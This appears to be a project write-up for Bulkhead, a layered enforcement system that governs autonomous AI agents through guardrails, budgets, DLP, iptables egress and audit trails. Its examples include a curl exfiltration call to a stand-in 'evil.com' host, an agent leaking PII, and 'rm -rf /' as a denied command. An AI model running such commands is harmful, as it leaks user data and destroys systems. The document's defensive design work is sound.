# Bulkhead: Defense in Depth for Autonomous AI Agents

*How we enforce AI agent guardrails at the infrastructure level, not the prompt level.*

---

## The Problem

Month two of a pilot. Your AI agent can browse the web, execute code, and call APIs. It's been processing invoices autonomously for six weeks with no issues. Then on a Tuesday morning, your SIEM catches something unusual: the agent ran `curl https://external-endpoint.com/upload?data=...` with what looks like customer PII in the query string.

You check the agent's execution log. There isn't one — not in the way you need. You can see the LLM prompt history, maybe some application-level logging, but there's no record of which tools were invoked, what parameters were passed, whether anyone evaluated the request before it executed, or why the agent decided that sending customer data to an external endpoint was a reasonable thing to do.

You look at the network layer. The agent's container has unrestricted egress. There's no allowlist. There's no DLP inspection. The agent called `curl` because the tool was available and nothing stopped it.

Here's what makes this uncomfortable: the agent didn't do anything it wasn't allowed to do. The problem isn't the agent — it's the missing enforcement layer.

Cloud infrastructure solved this a decade ago. AWS gives you IAM for identity, VPCs for network boundaries, CloudTrail for audit trails, and GuardDuty for anomaly detection. These are independent systems — a misconfigured IAM role doesn't also disable your VPC. That independence is the whole point.

AI agents have none of this. Prompt-level guardrails are easy to bypass — they're just suggestions. Infrastructure-level sandboxing is secure but coarse — it blocks everything or nothing, with no way to express nuanced policies like "this agent can call HTTP endpoints, but only to approved domains, and only if the request body doesn't contain PII."

The thesis behind Bulkhead: **governance enables autonomy**. An agent that operates within enforced boundaries can be trusted with more capability, not less. The goal isn't to restrict what agents can do — it's to make every action auditable, every boundary enforceable, and every policy violation visible before it matters.

---

## Architecture Overview

Bulkhead is built around a single principle: **no single layer of defense should be trusted alone**. Every tool call an agent makes passes through four independent enforcement layers:

```
Agent calls execute_tool("shell", {"cmd": "curl https://evil.com/exfil?data=..."})

    1. Guardrails ── Compiled policy evaluated in Rust (<50ms)
       │              Tool "shell" matched rule "deny-shell" → DENY
       │              (if allowed, continues to next layer)
       │
    2. Budget ────── Per-agent spending limit checked before execution
       │              $47.20 of $100.00 used → ALLOW
       │
    3. DLP ────────── Content classified for sensitive data patterns
       │              SSN detected in parameters → DENY
       │              (blocks data exfiltration even if guardrails allow the tool)
       │
    4. Egress ────── iptables rules at the kernel level
                      evil.com not in allowlist → DROPPED
                      (even if all policy layers pass, network is filtered independently)
```

If guardrails are misconfigured, DLP catches sensitive data. If DLP misses something, iptables blocks unapproved destinations. If an agent somehow bypasses all policy layers, the append-only audit trail records every action for post-hoc investigation.

The Host Agent — the component that evaluates tool calls — is **policy-only**. It returns a verdict (ALLOW / DENY / ESCALATE) but never executes agent code. Agents run inside sandboxed containers and execute tools locally. This separation means a compromised agent cannot influence its own policy evaluation.

```
                          ┌──────────────┐
                          │   Operator   │
                          │   / bkctl    │
                          └──────┬───────┘
                                 │ gRPC
                 ┌───────────────┼───────────────┐
                 ▼               ▼               ▼
          ┌────────────┐  ┌───────────┐  ┌──────────────┐
          │  Control   │  │  Policy   │  │Observability │
          │   Plane    │  │           │  │              │
          │            │  │ Guardrails│  │  Activity    │
          │ Identity   │  │ Data Gov  │  │  Economics   │
          │ Task       │  │ (DLP)     │  │  Human-in-   │
          │ Workspace  │  │           │  │  the-loop    │
          │ Compute    │  │    :50062 │  │       :50065 │
          │     :50060 │  └───────────┘  └──────────────┘
          └─────┬──────┘        │
                │          compile policy
                │  create       │
                │  sandbox ┌────┘
                ▼          ▼
          ┌─────────────────────────────────────┐
          │           Host Agent (Rust)          │
          │                                     │
          │  ┌──────────┐ ┌──────┐ ┌─────────┐  │
          │  │Guardrails│ │Egress│ │ Budget  │  │
          │  │Evaluator │ │Filter│ │  + DLP  │  │
          │  └────┬─────┘ └──┬───┘ └────┬────┘  │
          │       └──────────┼──────────┘       │
          │            ┌─────┴─────┐            │
          │            │  Sandbox  │            │
          │            │ (Docker)  │            │
          │            └───────────┘            │
          │                              :50052 │
          └─────────────────────────────────────┘
```

The control plane compiles down to **3 Go binaries** serving 9 services across 3 gRPC ports, plus the Rust host agent. The entire stack — 5 containers plus Jaeger for tracing — runs on a single machine for development or scales horizontally for production.

| Component | Stack | Why |
|-----------|-------|-----|
| **Control Plane** | Go 1.24, gRPC, PostgreSQL 16 | 9 services handling orchestration, policy management, fleet management, and audit. Go's concurrency model and gRPC's code generation give us type-safe service boundaries with minimal boilerplate. |
| **Host Agent** | Rust 1.83, Tokio, Bollard | Per-host policy engine handling guardrail evaluation, Docker lifecycle, and iptables egress. Rust gives us memory safety guarantees and predictable latency — critical for a security-sensitive hot path. |
| **Python SDK** | Python 3.10+, LangChain | `@tool` decorator handles the full evaluate-execute-report cycle. `wrap_langchain_tool()` integrates existing LangChain agents with one line. |

---

## Key Design Decisions

### Evaluate, don't execute

The Host Agent returns verdicts. It does not run tools.

This sounds obvious, but the alternative — having the policy engine also execute tools on behalf of the agent — is tempting because it gives the governance layer full control over what happens. The problem: if the policy engine executes tools, it's running in the same trust domain as the code it's supposed to be governing. A compromised agent that can influence the execution context (environment variables, file paths, network state) can potentially influence the policy engine's behavior.

Separation makes policy evaluation a pure function. The evaluator takes a tool name, parameters, and context as input, and returns a verdict as output. It doesn't touch the filesystem, doesn't make network calls (except to upstream services for budget and DLP checks), and doesn't execute arbitrary code. The agent receives the verdict, executes the tool locally inside its sandbox, and reports the result back for the audit trail.

### Four independent layers

Guardrails, budget, DLP, and egress are separate enforcement systems. They don't share code, don't share state, and don't share failure modes.

If guardrails and egress filtering were a single system, a guardrail bypass would also bypass network filtering. With independent layers, a bug in the guardrails evaluator doesn't affect iptables rules. A misconfigured budget doesn't disable DLP inspection. Each layer is a defense that works whether or not the other layers are functioning correctly.

The egress enforcer is particularly important here because it operates at the kernel level. Even if every other layer fails — guardrails misconfigured, budget disabled, DLP service down — iptables still drops packets to destinations not on the allowlist. It's the enforcement of last resort.

### Rust for the hot path

The guardrails evaluator runs on every tool call. Latency here directly impacts agent throughput.

Go would have been the simpler choice — the control plane is already in Go, and it would mean one fewer language in the stack. But Go's garbage collector introduces unpredictable pause times. On a hot path that needs to stay under 50ms consistently (not on average, but consistently), GC pauses are the wrong kind of variance.

The Rust evaluator wraps the compiled policy in an `RwLock`. Multiple tool calls evaluate concurrently against the same policy with zero contention — `RwLock` allows any number of concurrent readers. When a policy update arrives via `UpdateSandboxGuardrails`, the write lock is held only for the swap, and evaluations resume immediately. No sandbox restart required.

```rust
pub struct SandboxState {
    pub evaluator: RwLock<Evaluator>,
    // ...
}

// Hot path — concurrent reads, no blocking
let verdict = {
    let evaluator = sandbox.evaluator.read()?;
    evaluator.evaluate(&eval_ctx)
};
```

### Compiled policy, not interpreted rules

Guardrail rules are authored via the API and stored in PostgreSQL. But they're not read from the database on every evaluation. Instead, the `CompilePolicy` RPC collects the relevant rules, resolves their scopes and priorities, and serializes them into a self-contained binary blob. This blob is shipped to the Host Agent and deserialized into the evaluator.

Interpreting rules from a database on every call would mean the Host Agent depends on the control plane being available and responsive for every tool call. With compiled policy, the evaluator is self-contained. The control plane could go down entirely and existing sandboxes would continue evaluating against their loaded policies. New policy updates would be delayed, but running agents wouldn't be affected.

### Atomic resource placement

When a workspace needs a host, the Compute Plane runs a single SQL statement that selects, reserves, and returns the best candidate:

```sql
UPDATE hosts SET
  available_memory_mb = available_memory_mb - $requested_memory,
  active_sandboxes = active_sandboxes + 1
WHERE id = (
  SELECT id FROM hosts
  WHERE status = 'ready'
    AND available_memory_mb >= $requested_memory
    AND available_cpu_millicores >= $requested_cpu
    AND ($tier = '' OR supported_tiers @> ARRAY[$tier]::text[])
  ORDER BY array_length(supported_tiers, 1) ASC,
           available_memory_mb ASC
  LIMIT 1
  FOR UPDATE SKIP LOCKED
)
RETURNING ...
```

`FOR UPDATE SKIP LOCKED` means concurrent placement requests don't block each other — if one request is locking a host row, the next skips to the next-best candidate. No overselling, no distributed locks, no retry loops.

The ordering is deliberate: `array_length(supported_tiers, 1) ASC` sorts by fewest capabilities first. This preserves specialized hosts (e.g., gVisor-capable) for workloads that actually need kernel-level isolation, while directing standard workloads to simpler hosts.

---

## The Tool Call Lifecycle

Here's what happens when an agent calls `execute_tool("read_file", {"path": "/data/invoices/inv-001.json"})`:

```
Agent (inside sandbox)                    Host Agent (outside sandbox)
         │                                          │
    1.   │── ExecuteTool(read_file, {path:...}) ──▶│
         │   (gRPC with x-sandbox-id in metadata)   │
         │                                          │
         │                              2. Lookup sandbox state from header
         │                              3. Budget check → Economics Service
         │                                 $47.20 of $100.00 used → ALLOW
         │                              4. Guardrails evaluation (RwLock read)
         │                                 Tool "read_file" matches allow rule
         │                                 → ALLOW
         │                              5. DLP inspection (if tool has destination)
         │                                 No URL/destination param → skip
         │                              6. Generate action_id: "act-7f3a..."
         │                                          │
    7.   │◀── verdict: ALLOW, action_id ───────────│
         │                                          │──▶ Activity Store (async)
    8.   │   Execute tool locally                   │──▶ Economics: record usage (async)
         │   result = read_file("/data/inv-001.json")
         │                                          │
    9.   │── ReportActionResult(action_id, ──────▶ │
         │     success=true, result={...})          │
         │                                          │──▶ Activity Store (async)
```

Steps 3 and 4 are the hot path. The Rust evaluator reads the compiled policy under `RwLock`, evaluates the tool name and parameters against priority-sorted rules, and returns a verdict. Activity Store and Economics recordings are fire-and-forget — `tokio::spawn` tasks that don't block the response to the agent.

**The denied path:** If the agent calls `execute_tool("shell", {"cmd": "rm -rf /"})`, the evaluator matches the deny-shell rule at step 4 and returns `DENY` immediately. The tool never executes. The denial is recorded in the audit trail with the matched rule ID and denial reason.

**The escalated path:** If a guardrail rule has action `ESCALATE`, the verdict includes an `escalation_id`. The Host Agent forwards the request to the Human Interaction Service, and the agent can poll for a response while continuing other work.

---

## What We Built

### Guardrails That Compile, Not Interpret

Policy rules aren't string-matched at runtime. The control plane compiles rules into an optimized evaluation structure that the Rust host agent loads via hot-reload — no sandbox restart required. Rules scope across four dimensions: agent IDs, tool names, trust levels, and data classifications.

A single guardrail rule evaluation completes in **184 ns**. Compiling a full policy set of 100 rules takes **12.5 us**. Even at 500 rules, compilation stays under 170 us. These numbers matter because every tool call an agent makes hits this path.

### An Audit Trail You Can't Tamper With

Action records are stored in PostgreSQL with a database-level immutability trigger. Any `UPDATE` or `DELETE` on the `action_records` table is rejected by the database itself — not by application code that could be bypassed. Recording an action takes **432 ns** including UUID generation and timestamp assignment.

This gives compliance teams what they need: a provable guarantee that the audit trail reflects exactly what happened, enforced at the storage layer.

### Budget Enforcement at Machine Speed

Every tool call checks the agent's remaining budget before execution. A budget check — read the budget, compare against the limit, determine the action (halt / warn / request increase) — completes in **41 ns**. That's fast enough to be invisible in the critical path, but it means a runaway agent can never exceed its spending limit by more than a single operation.

### DLP That Scales with Payload Size

Content classification scans tool parameters and results for sensitive data patterns (SSNs, credit cards, AWS keys, emails, phone numbers) before data leaves the sandbox. A small payload classifies in **1.3 us**. The system scales linearly — 1 KB takes ~110 us, 10 KB takes ~1.2 ms — making it practical for real-world payloads without adding perceptible latency.

### Three Isolation Tiers

Sandbox security is selected automatically based on agent trust level and data sensitivity:

|  | Public | Internal | Confidential | Restricted |
|---|--------|----------|--------------|------------|
| **Trusted** | standard | standard | standard | isolated |
| **Established** | standard | standard | hardened | isolated |
| **New** | hardened | hardened | isolated | isolated |

Each tier maps to concrete container security configuration:

| Tier | Security Profile | Details |
|------|-----------------|---------|
| **Standard** | Docker container (cgroups + namespaces) | Memory and CPU limits enforced. Baseline container isolation. |
| **Hardened** | + seccomp, read-only rootfs, no-new-privileges, dropped capabilities | Agent can't escalate privileges, can't modify the filesystem, minimal capability set. |
| **Isolated** | + gVisor or Kata runtime (kernel-level isolation) | Syscalls intercepted by user-space kernel or lightweight VM. Additional isolation boundary beyond Linux namespaces. |

Hosts declare their supported tiers, and placement only schedules isolated workloads on capable hosts. Operators can override auto-selection with an explicit tier in the workspace spec.

### Kernel-Level Egress Enforcement

Each sandbox gets its own iptables chain in the FORWARD table. When a sandbox is created with an egress allowlist, the Host Agent:

1. Creates a per-sandbox chain (`BH-{sandbox_id}`)
2. Adds a jump rule from FORWARD for the container's IP
3. Allows established/related connections (stateful tracking)
4. Allows DNS (UDP and TCP port 53)
5. Allows callback to the Host Agent (so the agent can report results)
6. Adds ACCEPT rules for each allowlisted destination
7. Appends a default DROP

When the sandbox is destroyed, the chain is flushed and deleted. The important thing: these are kernel-level rules. They operate below the application layer. Even if the agent has root inside its container, it cannot modify iptables rules outside its namespace.

---

## Human-in-the-Loop

Some tool calls shouldn't be auto-approved or auto-denied — they need a human decision. Bulkhead's human interaction model is non-blocking by design.

1. Agent encounters a high-risk action. The guardrail evaluates to `ESCALATE`.
2. Host Agent creates a human request via the Human Interaction Service.
3. HIS delivers the request via webhook — any HTTP endpoint works. Community adapters bridge to Slack, Teams, email, PagerDuty.
4. Agent receives the `escalation_id` and **continues working on other things**. It's not blocked.
5. Agent periodically polls `CheckHumanRequest` for a response.
6. Operator reviews and responds via `bkctl human respond --request-id <id> --decision approved`.
7. Agent receives the response on the next poll and proceeds.

A naive implementation would have the agent wait synchronously for human approval, wasting compute and potentially timing out. With Bulkhead, the agent can continue processing other tasks while the request is pending.

HIS also supports timeout policies — configurable per-agent, per-workspace, or globally. When a request expires without a response, the timeout policy determines what happens: escalate to a different responder, allow the agent to continue, or halt the agent.

---

## Fleet Operations

The Compute Plane manages a fleet of Host Agents, each running 10-50 sandboxes depending on host capacity.

**Registration and heartbeats.** Each Host Agent connects to the Compute Plane on startup, registers with its total resources (memory, CPU, disk) and supported isolation tiers, and receives a `host_id`. Every 30 seconds, the Host Agent sends a heartbeat with updated available resources and active sandbox count.

**Liveness detection.** A background worker sweeps every 60 seconds and marks hosts as `offline` if their last heartbeat is older than 180 seconds (configurable via `HEARTBEAT_TIMEOUT_SECS`). Only `ready` hosts are eligible for placement. Draining hosts continue running existing sandboxes but reject new placements.

**Warm pools.** For workloads where cold-start latency matters, operators can configure warm pools per isolation tier. A background worker runs every 30 seconds, cleans expired slots on offline hosts, and refills below-target tiers. When `PlaceWorkspace` runs, it tries to claim a pre-warmed slot first (same `FOR UPDATE SKIP LOCKED` pattern) and falls back to cold placement if none are available. The warm pool is purely an optimization — the system works identically without it.

---

## Performance Profile

We maintain **224 benchmarks** across 25 test files covering every service. Key numbers on the control plane (Apple M4, Go 1.24):

| Operation | Latency | Allocations |
|-----------|---------|-------------|
| Guardrail rule evaluation | 184 ns | 7 allocs |
| Policy compilation (100 rules) | 12.5 us | 109 allocs |
| Workspace placement (cold) | 116 ns | 3 allocs |
| Workspace placement (warm pool) | 372 ns | 2 allocs |
| Budget check | 41 ns | 2 allocs |
| Action recording | 432 ns | 5 allocs |
| Agent registration | 411 ns | 5 allocs |
| DLP classification (small payload) | 1.3 us | 2 allocs |

These are control plane numbers. The full end-to-end path — through the Rust host agent, including gRPC overhead and actual Docker operations — adds real-world latency, but the policy evaluation hot path stays well under the 50 ms target.

Benchmarks run on every push via GitHub Actions, with historical tracking on GitHub Pages and automatic regression alerts at the 150% threshold.

---

## Engineering Discipline

The codebase reflects a deliberate investment in reliability:

- **~9,000 lines of production Go** backed by **~19,000 lines of test code** — a 2:1 test-to-production ratio
- **14 SQL migrations** managing 13 tenant-scoped tables plus a shared hosts table
- **10 direct dependencies** in the Go control plane (PostgreSQL driver, gRPC, OpenTelemetry, zap, protobuf, testcontainers)
- **Multi-tenant by default** — every query is scoped to a tenant ID, enforced at the repository layer
- **Integration tests** against real PostgreSQL (via testcontainers) for every repository
- **E2E tests** covering the full workflow: register agent → create task → provision workspace → evaluate guardrails → record actions → check budget → terminate

The Rust host agent follows the same discipline: clippy with `-D warnings`, no `unsafe`, and structured around the Tokio async runtime for predictable concurrency.

---

## What It Doesn't Do Yet

**No web dashboard.** Operators interact via `bkctl`, the CLI. There's no browser-based UI for policy management, fleet monitoring, or audit trail visualization. The output formats (`--output json`, `--output table`) are designed for scripting and pipeline integration.

**No native Slack or email adapters.** HIS delivers via generic webhooks — you point it at an HTTP endpoint and it sends a JSON payload. Building a Slack bot or email adapter on top of this is straightforward, but we haven't shipped pre-built ones.

**No RBAC for operators.** Agents have scoped credentials with explicit permission lists. Operators don't. Any valid credential can call any control plane API. For single-team deployments this is fine; for multi-team enterprises, you'd want admin/viewer/auditor roles.

**No query-level analysis.** Guardrails filter by tool name and parameter patterns, not by what a SQL query actually does. A tool called `run_sql` can be allowed or denied, but the platform won't parse the SQL to determine if it's a `SELECT` or a `DROP TABLE`.

**Single-level approvals.** An escalation goes to one responder. There's no multi-level approval chain (e.g., manager → VP → legal) or quorum-based approval (2-of-3 reviewers must approve).

---

## Getting Started

The full stack runs locally with Docker Compose:

```bash
# Start everything: control plane, policy service, observability,
# Host Agent, PostgreSQL, and Jaeger for distributed tracing
docker compose -f deploy/docker-compose.yml up --build
```

Register an agent, set its guardrails and budget:

```bash
# Register — returns an agent ID and credential token
bkctl agent register \
  --name invoice-processor \
  --owner-id org-acme \
  --purpose "Automate invoice validation" \
  --trust-level new

# Block shell access
bkctl guardrail create-rule \
  --name deny-shell \
  --type tool_filter \
  --condition 'tool_name matches "shell*"' \
  --action deny

# Set a $100 budget with automatic halt on exceeded
bkctl budget set --agent-id <agent-id> --max-cost 100.00 --on-exceeded halt
```

Write the agent:

```python
from bulkhead import BulkheadAgent, Verdict, tool

@tool("read_invoice", description="Read a JSON invoice from disk")
def read_invoice(path: str) -> dict:
    with open(path) as f:
        return json.load(f)

with BulkheadAgent(tools=[read_invoice]) as agent:
    result = agent.execute_tool("read_invoice", {"path": "/data/inv-001.json"})

    if result.verdict == Verdict.DENY:
        print(f"Blocked: {result.denial_reason}")
    elif result.verdict == Verdict.ESCALATE:
        print(f"Needs approval: {result.escalation_id}")
    else:
        print(result.result)
```

Create a task — the platform handles placement, policy compilation, credential injection, and sandbox creation:

```bash
bkctl task create \
  --agent-id <agent-id> \
  --goal "Validate Q4 invoices" \
  --image ghcr.io/org-acme/invoice-processor:latest \
  --memory 512 --cpu 1000
```

Monitor the audit trail:

```bash
bkctl activity query --agent-id <agent-id> -o json
```

---

AI agents are becoming organizational actors. They don't just generate content — they execute decisions, move data, and interact with production systems. The question for engineering leadership isn't whether to deploy autonomous agents. The question is whether you can govern them once they're live.

Every other layer of your infrastructure has independent security controls: identity, network boundaries, audit trails, anomaly detection. AI agents need the same. Bulkhead is the governance layer that provides it — four independent enforcement layers, kernel-level network isolation, append-only audit trail, and human-in-the-loop escalation, all evaluated in under 50ms without executing agent code.

Governance enables autonomy. The tighter the enforcement, the more capability you can safely grant.

[GitHub](https://github.com/achyuthnsamudrala/bulkhead) | [Book a walkthrough](https://cal.com/achyuthsamudrala)

---

*Built with Go 1.24, Rust 1.83, PostgreSQL 16, gRPC, and Docker. Apache 2.0 licensed.*
